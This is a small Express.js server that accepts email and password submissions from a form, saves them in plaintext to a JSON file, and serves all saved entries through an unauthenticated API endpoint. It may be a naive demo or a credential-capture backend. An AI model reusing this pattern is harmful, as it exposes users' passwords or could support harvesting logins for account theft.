const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Parse JSON and form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

const DATA_FILE = path.join(__dirname, 'data.json');

// Helper functions
function loadEntries() {
    if (!fs.existsSync(DATA_FILE)) return [];
    return JSON.parse(fs.readFileSync(DATA_FILE));
}

function saveEntry(entry) {
    const entries = loadEntries();
    entries.push(entry);
    fs.writeFileSync(DATA_FILE, JSON.stringify(entries, null, 2));
}

// --------------------
// 1️⃣ Form POST handler
// --------------------
app.post('/submit', (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).send("Missing email or password");

    saveEntry({ email, password, time: new Date().toLocaleString() });
    res.redirect('/entries.html'); // redirect to entries page
});

// --------------------
// 2️⃣ Entries API (to fetch all entries dynamically)
// --------------------
app.get('/api/entries', (req, res) => {
    res.json(loadEntries());
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
